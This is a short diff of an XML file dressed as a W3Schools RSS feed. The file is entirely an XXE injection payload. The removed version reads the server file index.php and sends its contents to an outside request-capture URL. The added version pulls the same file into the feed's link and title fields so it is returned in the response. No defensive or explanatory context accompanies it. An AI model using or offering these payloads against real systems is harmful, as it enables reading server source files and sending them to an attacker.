@@ -1,17 +1,15 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY % data SYSTEM "file:///./index.php">
-<!ENTITY exfil SYSTEM "http://requestb.in/1ayyz3l1?d=%data;">
-%data;
+<!ENTITY data SYSTEM "file:///./index.php">
 ]>
 <rss version="2.0">
 <channel>
   <title>W3Schools Home Page</title>
-  <link>&exfil;</link>
+  <link>&data;</link>
   <description>Free web building tutorials</description>
   <item>
-    <title>&exfil;</title>
+    <title>&data;</title>
     <link>http://www.w3schools.com/xml/xml_rss.asp</link>
     <description>New RSS tutorial on W3Schools</description>
   </item>
